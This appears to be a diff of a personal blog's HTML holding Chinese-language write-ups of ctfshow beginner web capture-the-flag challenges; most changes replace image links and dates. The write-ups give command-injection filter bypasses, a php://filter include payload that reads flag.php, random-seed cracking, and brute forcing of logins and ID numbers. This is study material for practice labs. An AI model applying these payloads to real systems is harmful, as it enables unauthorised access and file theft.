+<img src="https://a1.boltp.com/2025/02/15/67b02c0369dbe.png" title alt style="zoom:50%;">
 
 <p>?c&#x3D;show_source(next(array_reverse(scandir(current(localeconv())))));显示数组1的高亮文字  得到flag</p>
-<p><img src="https://www.helloimg.com/i/2025/01/23/6791ef5f7cf06.png"></p>
+<p><img src="https://a1.boltp.com/2025/02/15/67b02c0423c26.png"></p>
 
       
     </div>
@@ -819,7 +779,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2025-01-25 13:01:47" itemprop="dateModified" datetime="2025-01-25T13:01:47+08:00">2025-01-25</time>
+                <time title="Modified: 2025-02-15 13:47:36" itemprop="dateModified" datetime="2025-02-15T13:47:36+08:00">2025-02-15</time>
               </span>
 
           
@@ -835,49 +795,47 @@
       
           <p>                                                                        ctfshow   web入门    命令篇(一)</p>
 <p>    <strong>web29</strong></p>
-<img src="https://www.helloimg.com/i/2025/01/21/678f3543bc6b0.png" title alt style="zoom:33%;">
-
+<p><img src="https://a1.boltp.com/2025/02/15/67b02a45418e7.png"></p>
 <p>1.进入后发现是代码审计</p>
-<p><img src="https://www.helloimg.com/i/2025/01/21/678f35a2496b6.png"></p>
+<p><img src="https://a1.boltp.com/2025/02/15/67b02a45418fc.png"></p>
 <p>2.目的是进入if中    首先要符合  <strong>!preg_match(“&#x2F;flag&#x2F;i”, $c</strong> )  即c的变量不能包含flag的大小写(&#x2F;i指的是无视大小写)</p>
 <p>3.先查看网页的目录利用命令  <strong>ls</strong></p>
-<p><img src="https://www.helloimg.com/i/2025/01/21/678f36a51360a.png"></p>
+<p><img src="https://a1.boltp.com/2025/02/15/67b02a45418de.png"></p>
 <p>4.发现存在flag.php  利用*或?绕过    得到flag    用cat命令也可以但需要打开源代码才能查看flag</p>
-<p><img src="https://www.helloimg.com/i/2025/01/21/678f372d2fb84.png"></p>
+<p><img src="https://a1.boltp.com/2025/02/15/67b028cf6f6a1.png"></p>
 <p><strong>web30</strong></p>
-<img src="https://www.helloimg.com/i/2025/01/21/678f3ab2b34a8.png" title alt style="zoom:33%;">
-
+<p><img src="https://a1.boltp.com/2025/02/15/67b028ceb4b51.png"></p>
 <p>1.进入后发发现我们要绕过**!preg_match(“&#x2F;flag|system|php&#x2F;i”, $c)**</p>
 <p>System可以用passthru代替</p>
 <p>flag.php  用fla?.php  或者  *符合绕过</p>
 <p>然后得到flag</p>
-<p><img src="https://www.helloimg.com/i/2025/01/21/678f3b86929ee.png"></p>
-<p><img src="https://www.helloimg.com/i/2025/01/21/678f3bc5194ab.png"></p>
+<p><img src="https://a1.boltp.com/2025/02/15/67b028cf6f5d2.png"></p>
+<p><img src="https://a1.boltp.com/2025/02/15/67b028cfa701d.png"></p>
 <p><strong>web31</strong></p>
-<img src="https://www.helloimg.com/i/2025/01/21/678f3e98e9ad3.png" title alt style="zoom:33%;">
-
+<p><img src="https://a1.boltp.com/2025/02/15/67b028ceae92b.png"></p>
 <p>1.进入后发现要绕过&#x2F;flag|system|php|cat|sort|shell|.| |&#39;&#x2F;i  比上一题多了个空格</p>
-<p><img src="https://www.helloimg.com/i/2025/01/21/678f3f29440f5.png"></p>
+<img src="https://a1.boltp.com/2025/02/15/67b028cfae5bb.png" title alt style="zoom:50%;">
+
 <p>空格可以用%09代替</p>
 <p>然后得到flag</p>
-<p><img src="https://www.helloimg.com/i/2025/01/21/678f3f4edee7a.png"></p>
+<p><img src="https://a1.boltp.com/2025/02/15/67b028cebebca.png"></p>
 <p><strong>web32</strong></p>
-<img src="https://www.helloimg.com/i/2025/01/21/678f461ee44ed.png" title alt style="zoom:33%;">
-
+<p><img src="https://a1.boltp.com/2025/02/15/67b027d16a3ae.png"></p>
 <p>1.进入网页后 发现过滤<code>flag|system|php|cat|sort|shell|\.| |\&#39;|\`|echo|\;|\(/i</code></p>
 <p>利用文件包含来获取</p>
 <p>c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php(相当于建立一个a网页并把flag.php的内容进行base64编码后复制到a网页)</p>
-<img title src="https://www.helloimg.com/i/2025/01/21/678f604f6f2ee.png" alt style="zoom:33%;">
-
+<p><img src="https://a1.boltp.com/2025/02/15/67b027d222254.png"></p>
 <p>2.进行base64解码 得到flag</p>
-<p><img src="https://www.helloimg.com/i/2025/01/21/678f60e3845dd.png"></p>
+<p><img src="https://a1.boltp.com/2025/02/15/67b027d230acc.png"></p>
 <p><strong>web33</strong></p>
-<img src="https://www.helloimg.com/i/2025/01/21/678f659a402e2.png" title alt style="zoom:50%;">
+<img src="https://a1.boltp.com/2025/02/15/67b027d167bf6.png" title alt style="zoom:50%;">
 
 <p>1.和web32一样直接利用c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
-<p><img src="https://www.helloimg.com/i/2025/01/21/678f66b028a14.png" title alt style="zoom:33%;"><img src="https://www.helloimg.com/i/2025/01/21/678f66cea8227.png" title alt style="zoom:33%;"></p>
+<img src="https://a1.boltp.com/2025/02/15/67b027d164d05.png" title alt style="zoom:50%;">
+
+<p><img src="https://a1.boltp.com/2025/02/15/67b027d220368.png"></p>
 <p>解码后得到flag</p>
-<p><img src="https://www.helloimg.com/i/2025/01/21/678f674a89c80.png"></p>
+<p><img src="https://a1.boltp.com/2025/02/15/67b027d26de0b.png"></p>
 <p><strong>web34</strong></p>
 <p>参考<strong>web33</strong>  一模一样</p>
 
@@ -930,7 +888,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2025-01-25 13:00:26" itemprop="dateModified" datetime="2025-01-25T13:00:26+08:00">2025-01-25</time>
+                <time title="Modified: 2025-02-15 12:56:46" itemprop="dateModified" datetime="2025-02-15T12:56:46+08:00">2025-02-15</time>
               </span>
 
           
@@ -946,36 +904,53 @@
       
           <p>                                                                                ctfshow   web入门  爆破篇  (二)</p>
 <p><strong>web  26</strong></p>
-<img src="https://www.helloimg.com/i/2025/01/19/678cb5afaa5dc.png" title alt style="zoom:33%;">
+<img src="https://a1.boltp.com/2025/02/15/67b01e8113223.png" title alt style="zoom:50%;">
 
 <p>1.进入页面后直接点击”确定无误,开始安装”输入并抓包</p>
-<p><img src="https://www.helloimg.com/i/2025/01/19/678cb77602ba3.png"></p>
+<img src="https://a1.boltp.com/2025/02/15/67b01ba27b1b1.png" title alt style="zoom:50%;">
+
 <p>2.发送到重放器点击发送得到flag</p>
-<p><img src="https://www.helloimg.com/i/2025/01/19/678cb87572891.png"></p>
+<img src="https://a1.boltp.com/2025/02/15/67b01ba28e8e3.png" title alt style="zoom:50%;">
+
+
+
+
+
+
+
 <p><strong>web  27</strong></p>
-<img src="https://www.helloimg.com/i/2025/01/19/678cb9cbcb34c.png" title alt style="zoom:33%;">
+<img src="https://a1.boltp.com/2025/02/15/67b01ba1b5c63.png" title alt style="zoom:50%;">
 
 <p>1.进入后点击录取名单和学生学籍信息查询系统</p>
-<p><img src="https://www.helloimg.com/i/2025/01/19/678cb9a5d4be9.png"></p>
+<p><img src="https://a1.boltp.com/2025/02/15/67b01ba284348.png"></p>
 <p>2.进入之后输入信息抓包</p>
-<p><img src="https://www.helloimg.com/i/2025/01/19/678cba50f3e09.png" title alt style="zoom:33%;"><img src="https://www.helloimg.com/i/2025/01/19/678cba8220b29.png"></p>
+<p><img src="https://a1.boltp.com/2025/02/15/67b01ba1c1c6d.png"></p>
+<p><img src="https://a1.boltp.com/2025/02/15/67b01ba1c2078.png"></p>
 <p>3.因为身份证少了出生日期  所以直接爆破</p>
-<p><img src="https://www.helloimg.com/i/2025/01/19/678cbb4c241bb.png"></p>
+<p><img src="https://a1.boltp.com/2025/02/15/67b01ba28e9a4.png"></p>
 <p>4.按照长度排序</p>
-<img src="https://www.helloimg.com/i/2025/01/19/678cbf56cd36c.png" title alt style="zoom:33%;">
+<img src="https://a1.boltp.com/2025/02/15/67b01a8c46ca5.png" title alt style="zoom:50%;">
 
 <p>5.输入结果后得到</p>
-<p><img src="https://www.helloimg.com/i/2025/01/19/678cbf9ae3f55.png"></p>
+<p><img src="https://a1.boltp.com/2025/02/15/67b01a8b71c61.png"></p>
 <p>6.在登录界面输入后得到flag</p>
-<p><img src="https://www.helloimg.com/i/2025/01/19/678cc0d843c12.png"></p>
+<img src="https://a1.boltp.com/2025/02/15/67b01a8c316ed.png" title alt style="zoom:50%;">
+
+
+
+
+
 <p><strong>web  28</strong></p>
-<p><img src="https://www.helloimg.com/i/2025/01/19/678cc02885293.png"></p>
+<img src="https://a1.boltp.com/2025/02/15/67b01a8b8b5d0.png" title alt style="zoom:50%;">
+
 <p>1.看到url后猜测是爆破目录</p>
-<p><img src="https://www.helloimg.com/i/2025/01/19/678cc0970b4a4.png"></p>
+<p><img src="https://a1.boltp.com/2025/02/15/67b01a8b7ebce.png"></p>
 <p>2.设置两个攻击点 如图</p>
-<p><img src="https://www.helloimg.com/i/2025/01/19/678cc4621fc45.png"></p>
+<p><img src="https://a1.boltp.com/2025/02/15/67b01a8c4d890.png"></p>
 <p>3.只保留200状态码  得到flag</p>
-<p><img src="https://www.helloimg.com/i/2025/01/19/678cc3cb26c4f.png"></p>
+<img src="https://a1.boltp.com/2025/02/15/67b01a8c3f35f.png" title alt style="zoom:50%;">
+
+
 
       
     </div>
@@ -1026,7 +1001,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2025-01-25 12:59:39" itemprop="dateModified" datetime="2025-01-25T12:59:39+08:00">2025-01-25</time>
+                <time title="Modified: 2025-02-15 12:31:28" itemprop="dateModified" datetime="2025-02-15T12:31:28+08:00">2025-02-15</time>
               </span>
 
           
@@ -1042,66 +1017,63 @@
       
           <p>                                                        ctfshow web 入门 爆破篇    (一)</p>
 <p><strong>web  21</strong></p>
-<img src="https://www.helloimg.com/i/2025/01/17/678a169468627.png" title alt style="zoom:67%;">
+<img src="https://a1.boltp.com/2025/02/15/67b015d644a56.png" title alt style="zoom:33%;">
 
 <p>1.先下载题目给的密码和打开网页</p>
-<p><img src="https://www.helloimg.com/i/2025/01/17/678a176921941.png"></p>
+<img src="https://a1.boltp.com/2025/02/15/67b015d57f470.png" title alt style="zoom:33%;">
+
 <p>2.猜测账号为admin  密码随便输   进行抓包</p>
 <p>抓完包后发到lntruderl</p>
-<img title src="https://www.helloimg.com/i/2025/01/17/678a181459c0d.png" alt style="zoom:50%;">
-
+<p><img src="https://a1.boltp.com/2025/02/15/67b015d6533c8.png"></p>
 <p>3.猜测最下面的是刚才是输出的账号和密码并猜测为base64编码  并且因为是post传参所以取消url  进行解码</p>
-<img src="https://www.helloimg.com/i/2025/01/17/678a18a51e09b.png" title alt style="zoom:33%;">
-
+<p><img src="https://a1.boltp.com/2025/02/15/67b015d587cc2.png"></p>
 <p>4.看到解码  pload设置:前缀为admin:的base64编码  其他的设置如图</p>
-<p><img src="https://www.helloimg.com/i/2025/01/17/678a193d825b4.png"></p>
+<p><img src="https://a1.boltp.com/2025/02/15/67b015d58ad3d.png"></p>
 <p>5.进行攻击  然后看状态码200就可以得到flag</p>
 <p><strong>web  22</strong></p>
-<img src="https://www.helloimg.com/i/2025/01/17/678a1acd5d3e0.png" title alt style="zoom:67%;">
+<img src="https://a1.boltp.com/2025/02/15/67b015d6304e8.png" title alt style="zoom:33%;">
 
 <p>.这道题好像写不了了</p>
 <p><strong>web 23</strong></p>
-<img src="https://www.helloimg.com/i/2025/01/17/678a1b66c118c.png" title alt style="zoom:67%;">
+<img src="https://a1.boltp.com/2025/02/15/67b015d63b128.png" title alt style="zoom:33%;">
 
 <p>1.进入页面随便传一个参数然后抓包</p>
-<img title src="https://www.helloimg.com/i/2025/01/17/678a1ca25f130.png" alt style="zoom:33%;">
+<img src="https://a1.boltp.com/2025/02/15/67b016f79b28e.png" title alt style="zoom:33%;">
 
 <p>2.然后发到lntruderl</p>
 <p>3.设置参数为攻击点    并按照如图设置</p>
-<p><img src="https://www.helloimg.com/i/2025/01/17/678a1e2062e4a.png"></p>
-<p>4.攻击结束后   按照长度排序第一个不同的就对代开后得到flag</p>
-<p><img src="https://www.helloimg.com/i/2025/01/17/678a1e966fc73.png"></p>
-<p><img src="https://www.helloimg.com/i/2025/01/17/678a1f0b62cea.png"></p>
-<p><strong>web 24</strong></p>
-<img src="https://www.helloimg.com/i/2025/01/17/678a1f99eb304.png" title alt style="zoom:50%;">
+<img src="https://a1.boltp.com/2025/02/15/67b016f6c5c68.png" title alt style="zoom:50%;">
 
+<p>4.攻击结束后   按照长度排序第一个不同的就对代开后得到flag</p>
+<p><img src="https://a1.boltp.com/2025/02/15/67b016f7a453d.png"></p>
+<img src="https://a1.boltp.com/2025/02/15/67b016f6dec4c.png" title alt style="zoom:33%;">
+
+<p><strong>web 24</strong></p>
+<p><img src="https://a1.boltp.com/2025/02/15/67b016f6eb097.png"></p>
 <p>1.进入后发现是代码审计</p>
-<img src="https://www.helloimg.com/i/2025/01/17/678a1ffd2512b.png" title alt style="zoom:50%;">
+<img src="https://a1.boltp.com/2025/02/15/67b016f773053.png" title alt style="zoom:50%;">
 
 <p>2.看到随机种子直接发到php在线运行网页中运行</p>
-<img title src="https://www.helloimg.com/i/2025/01/17/678a206c585a0.png" alt style="zoom:33%;">
+<img src="https://a1.boltp.com/2025/02/15/67b016f781e8a.png" title alt style="zoom:50%;">
 
 <p>3.直接传入参数r&#x3D;1155388967  得到flag</p>
-<img src="https://www.helloimg.com/i/2025/01/17/678a210bdde4a.png" title alt style="zoom:50%;">
-
+<p><img src="https://a1.boltp.com/2025/02/12/67ac399589912.png"></p>
 <p><strong>web  25</strong></p>
-<img src="https://www.helloimg.com/i/2025/01/17/678a2203d941e.png" title alt style="zoom:50%;">
+<img src="https://a1.boltp.com/2025/02/12/67ac399598af7.png" title alt style="zoom:33%;">
 
 <p>1.进入后发现为代码审计 先输入r&#x3D;0得到<code>-intval(mt_rand())</code>的值</p>
-<img src="https://www.helloimg.com/i/2025/01/17/678a2276b4474.png" title alt style="zoom:33%;">
+<img src="https://a1.boltp.com/2025/02/12/67ac39953b887.png" title alt style="zoom:50%;">
 
 <p>2.利用kali下载php_mt_seed工具爆破种子</p>
-<p><img src="https://www.helloimg.com/i/2025/01/17/678a232ab4563.png"></p>
+<p><img src="https://a1.boltp.com/2025/02/12/67ac3995f2c65.png"></p>
 <p>3.查看网页的php版本</p>
-<p><img src="https://www.helloimg.com/i/2025/01/17/678a23809b4aa.png"></p>
+<p><img src="https://a1.boltp.com/2025/02/12/67ac39953b8ba.png"></p>
 <p>4.因此有两个种子被爆出来  一一测试先测试1313138925</p>
 <p>5.在php在线网页运行</p>
-<img src="https://www.helloimg.com/i/2025/01/17/678a24881fdd8.png" title alt style="zoom:33%;">
-
+<p><img src="https://a1.boltp.com/2025/02/12/67ac3994bde9b.png"></p>
 <p>4.输入后不会  换为第二个种子3985641666</p>
-<p><img src="https://www.helloimg.com/i/2025/01/17/678a2fb4017b6.png"></p>
+<p><img src="https://a1.boltp.com/2025/02/12/67ac399456744.png"></p>
 <p> 5.输入参数得到flag</p>
-<p><img src="https://www.helloimg.com/i/2025/01/17/678a2fec39641.png"></p>
 
       
     </div>
@@ -1152,7 +1124,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2025-01-17 19:38:49" itemprop="dateModified" datetime="2025-01-17T19:38:49+08:00">2025-01-17</time>
+                <time title="Modified: 2025-02-12 13:47:47" itemprop="dateModified" datetime="2025-02-12T13:47:47+08:00">2025-02-12</time>
               </span>
 
           
@@ -1167,103 +1139,105 @@
 
       
           <p>    <strong>web 12:</strong></p>
-<p><img src="https://www.helloimg.com/i/2025/01/17/678a3b1f4e000.png"></p>
+<p><img src="https://s21.ax1x.com/2025/02/11/pEnIPpR.jpg"></p>
 <p>1. 进入网页后先查看源代码发现什么也没有  再抓包发现也是一无所获</p>
 <p>2. 用虚拟机kali 命令dirsearch 网页地址 -e*扫描网页    发现robots.txt</p>
-<p><img src="https://www.helloimg.com/i/2025/01/17/678a3b3a8debf.png"></p>
+<p><img src="https://s21.ax1x.com/2025/02/11/pEnI24J.jpg"></p>
 <p>robots.txt: 一种协议(robots协议 也称爬虫协议)  作用:显示可访问的页面</p>
 <p>3. 进入admin页面出现了登录界面</p>
-<p><img src="https://www.helloimg.com/i/2025/01/17/678a3b5fa8466.png"></p>
+<p><img src="https://s21.ax1x.com/2025/02/11/pEnIBj0.jpg"></p>
 <p>4. 猜测账号是:damin</p>
 <p>5. 在看了别人写的wp发现密码在刚开始页面的最<u><span><font face="宋体">下面</font>372619038</span></u></p>
-<p><img src="https://www.helloimg.com/i/2025/01/17/678a3b7686058.png"></p>
+<p><img src="https://s21.ax1x.com/2025/02/11/pEnIruV.jpg"></p>
 <p>6. 输入账号密码后得到flag</p>
 <p>    <strong>web 13:</strong></p>
-<p><img src="https://www.helloimg.com/i/2025/01/17/678a3bc139b03.png"></p>
+<p><img src="https://a1.boltp.com/2025/02/12/67ac34da1a479.png"></p>
 <p>1. 对网页进行一系列操作(如:查看页面源代码、用dirsearch命令等)</p>
 <p>2. 发现一无所获</p>
 <p>3. 发现题目给出提示</p>
-<p>4. <img src="https://www.helloimg.com/i/2025/01/17/678a3bda559f0.png"></p>
+<p>4. <img src="https://a1.boltp.com/2025/02/12/67ac34d9ec21c.png" title alt style="zoom:50%;"></p>
 <p>5. 回到网页进行检查在网页的最下放发现document(译:文件)并且可以点击</p>
 <p>6. 进入后发现</p>
-<p><img src="https://www.helloimg.com/i/2025/01/17/678a3c10bc972.png"></p>
+<img src="https://a1.boltp.com/2025/02/12/67ac34d9d1f37.png" title alt style="zoom:50%;">
+
 <p>7. 直接点击给出的后台地址会发现错误    需要把you-domain改为你的网页地址</p>
-<p>8. <img src="https://www.helloimg.com/i/2025/01/17/678a3bf898596.png"></p>
+<p>8. <img src="https://a1.boltp.com/2025/02/12/67ac34d8783e8.png"></p>
 <p>9. 输入账号和密码后等到flag</p>
-<p>10.<img src="https://www.helloimg.com/i/2025/01/17/678a3c2819d29.png"></p>
 <p>    <strong>Web 14:</strong></p>
-<p> <img src="https://www.helloimg.com/i/2025/01/17/678a3c708475f.png"></p>
+<p> <img src="https://a1.boltp.com/2025/02/12/67ac34d968db5.png" title alt style="zoom:50%;"></p>
 <p>1. 题目给出提示直接访问&#x2F;editor</p>
-<p>2. 进入<img src="https://www.helloimg.com/i/2025/01/17/678a3c8c315b8.png"></p>
+<p>2. 进入<img src="https://a1.boltp.com/2025/02/12/67ac34d9307d2.png" title alt style="zoom:50%;"></p>
 <p>3. 不管输入什么都会是404页面</p>
 <p>4. 然后下意识就去上传一句话木马结果:</p>
-<p>5. <img src="https://www.helloimg.com/i/2025/01/17/678a3ca581087.png"></p>
+<p>5. <img src="https://a1.boltp.com/2025/02/12/67ac34d8867e3.png" title alt style="zoom:50%;"></p>
 <p>6. 之后,在上传图片的网络图片中发现网页根目录</p>
-<p>7. <img src="https://www.helloimg.com/i/2025/01/17/678a3cc106197.png"></p>
-<p><img src="https://www.helloimg.com/i/2025/01/17/678a3cd73b4ab.png"></p>
+<p>7. <img src="https://a1.boltp.com/2025/02/12/67ac34d925c6e.png" title alt style="zoom:50%;"></p>
+<img src="https://a1.boltp.com/2025/02/12/67ac34d9594ee.png" title alt style="zoom:50%;">
+
 <p>8. 最后发现var&#x2F;www&#x2F;html&#x2F;nothinghere&#x2F;fl000g.txt</p>
 <p>9. 访问   网站地址&#x2F;nothinghere&#x2F;fl000g.txt   得到flag</p>
 <p>    <strong>Web 15:</strong></p>
-<p> <img src="https://www.helloimg.com/i/2025/01/17/678a3d26c7c1d.png"></p>
+<p> <img src="https://a1.boltp.com/2025/02/12/67ac34d86dff1.png" title alt style="zoom:50%;"></p>
 <p>1. 先对网页进行操作   在用dirsearch命令扫描后得到</p>
-<p><img src="https://www.helloimg.com/i/2025/01/17/678a3d3b66512.png"></p>
+<p><img src="https://s21.ax1x.com/2025/02/11/pEnxMCV.jpg"></p>
 <p>2. 访问到admin时发现进入到  后台登录系统</p>
-<p><img src="https://www.helloimg.com/i/2025/01/17/678a3d4ea7565.png"></p>
+<img src="https://s21.ax1x.com/2025/02/11/pEnxQ3T.jpg" title alt style="zoom:33%;">
+
 <p>3. 在查遍整个网页后就发现一个邮件  把邮件号当作密码输入错误  在忘记密码中输入邮件号依然错误</p>
 <p>4. 因为忘记密码要输入地点  使用在qq中查找  但我没查到不知道为什么   网上看攻略是查到了</p>
-<p>5. <img src="https://www.helloimg.com/i/2025/01/17/678a3d6a79e01.png"><img src="https://www.helloimg.com/i/2025/01/17/678a3d93eaa22.png"></p>
+<p>5. <img src="https://s21.ax1x.com/2025/02/11/pEnxnNq.jpg" title alt style="zoom:50%;"></p>
 <p>6. 在忘记密码中输入  西安  给出新密码</p>
 <p>7. 在登录中账号:admin  密码:给出的</p>
-<p>8. 得到flag:<img src="https://www.helloimg.com/i/2025/01/17/678a3daea3b45.png"></p>
+<p>8. 得到flag</p>
 <p>    </p>
 <p> </p>
 <p>   <strong>Web 16:</strong></p>
-<p> <img src="https://www.helloimg.com/i/2025/01/17/678a3dee442b2.png"></p>
+<p> <img src="https://s21.ax1x.com/2025/02/11/pEnxEuQ.jpg" title alt style="zoom:50%;"></p>
 <p>1. 题目给出提示测试探针</p>
-<p>2. 探针:<img src="https://www.helloimg.com/i/2025/01/17/678a3e089fa1f.png"></p>
+<p>2. 探针:<img src="https://s21.ax1x.com/2025/02/11/pEnxVBj.jpg"></p>
 <p>3. 在访问url加入后缀后</p>
-<p><img src="https://www.helloimg.com/i/2025/01/17/678a3e237d9b1.png"></p>
+<img src="https://s21.ax1x.com/2025/02/11/pEnxmEn.jpg" title alt style="zoom:50%;">
+
 <p>4. 点击phpinfo进入</p>
-<p><img src="https://www.helloimg.com/i/2025/01/17/678a3e3f61ea3.png"></p>
+<img src="https://s21.ax1x.com/2025/02/11/pEnxu40.jpg" title alt style="zoom:50%;">
+
 <p>5. 搜索flag</p>
 <p>6. 找到flag</p>
 <p>    <strong>Web 17:</strong></p>
-<p> <img src="https://www.helloimg.com/i/2025/01/17/678a3e79a6e06.png"></p>
+<p> <img src="https://s21.ax1x.com/2025/02/11/pEnxZHs.jpg" title alt style="zoom:50%;"></p>
 <p>1. 提示说会有文件泄露  这种情况一般直接用命令dirsearch扫描网页</p>
 <p>2. 扫描结果</p>
-<p>3. <img src="https://www.helloimg.com/i/2025/01/17/678a3e9bbac67.png"></p>
+<p>3. <img src="https://s21.ax1x.com/2025/02/11/pEnjAG8.jpg"></p>
 <p>4. 直接访问网页&#x2F;backup.sql</p>
 <p>5. 然后就下载</p>
-<p><img src="https://www.helloimg.com/i/2025/01/17/678a3eb52ce7e.png"></p>
+<p><img src="https://s21.ax1x.com/2025/02/11/pEnjiIP.jpg"></p>
 <p>6. 进入直接发现flag</p>
-<p> <img src="https://www.helloimg.com/i/2025/01/17/678a3ecb45575.png"></p>
+<p> <img src="https://s21.ax1x.com/2025/02/11/pEnjkPf.jpg"></p>
 <p>   ** Web 18:**</p>
-<p> <img src="https://www.helloimg.com/i/2025/01/17/678a3efe422cb.png"></p>
+<p> <img src="https://s21.ax1x.com/2025/02/11/pEnXzKH.jpg" title alt style="zoom:33%;"></p>
 <p>1.进入后发现是个小游戏 我觉得一般人都不能通过玩获得flag</p>
 <p>2.按f12在调试器的js文件中找到变量score和条件&gt;100</p>
 <p>3.直接在控制台输入score&#x3D;200 在游戏开始时按Enter</p>
-<p> <img src="https://www.helloimg.com/i/2025/01/17/678a3f1c941cc.png"></p>
+<p> <img src="https://s21.ax1x.com/2025/02/11/pEnjpqA.jpg" title alt style="zoom:50%;"></p>
 <p>4. 幺幺零点皮爱吃皮&#x3D;110.php</p>
 <p>5. 访问网站&#x2F;110.php 得到flag</p>
-<p>6. <img src="https://www.helloimg.com/i/2025/01/17/678a3f33d8528.png"></p>
 <p>        </p>
 <p><strong>Web 19:</strong></p>
-<p> <img src="https://www.helloimg.com/i/2025/01/17/678a3f67426d2.png"></p>
+<p> <img src="https://s21.ax1x.com/2025/02/11/pEnjSrd.jpg" title alt style="zoom:33%;"></p>
 <p>1. 打开网页源代码</p>
-<p>2. <img src="https://www.helloimg.com/i/2025/01/17/678a3f7cc73ef.png"></p>
+<p>2. <img src="https://s21.ax1x.com/2025/02/11/pEnjPat.jpg" title alt style="zoom:50%;"></p>
 <p>3. 根据给出提示直接在f12的hackbar的post中输入</p>
-<p>4. <img src="https://www.helloimg.com/i/2025/01/17/678a3f938d7d6.png"></p>
+<p>4. <img src="https://s21.ax1x.com/2025/02/11/pEnjCVI.jpg"></p>
 <p>5. 直接得到flag</p>
-<p>6. <img src="https://www.helloimg.com/i/2025/01/17/678a3fb0a7650.png"></p>
 <p>    </p>
 <p><strong>Web 20:</strong></p>
-<p> <img src="https://www.helloimg.com/i/2025/01/17/678a4010d0476.png"></p>
+<p> <img src="https://s21.ax1x.com/2025/02/11/pEnokCj.jpg"></p>
 <p>1. 直接用dirsearch扫描网页  扫描结果为</p>
-<p><img src="https://www.helloimg.com/i/2025/01/17/678a4025be4bb.png"></p>
+<p><img src="https://s21.ax1x.com/2025/02/11/pEnoi5Q.jpg"></p>
 <p>2. 接着用命令dirsearch扫描网页&#x2F;db  得到</p>
-<p><img src="https://www.helloimg.com/i/2025/01/17/678a404298dc0.png"></p>
+<p><img src="https://s21.ax1x.com/2025/02/11/pEnoPUg.jpg"></p>
 <p>3. 直接访问下载文件在直接查找flag</p>
-<p><img src="https://www.helloimg.com/i/2025/01/17/678a4058e8296.png"></p>
+<p><img src="https://s21.ax1x.com/2025/02/11/pEnoA8s.jpg"></p>
 
       
     </div>
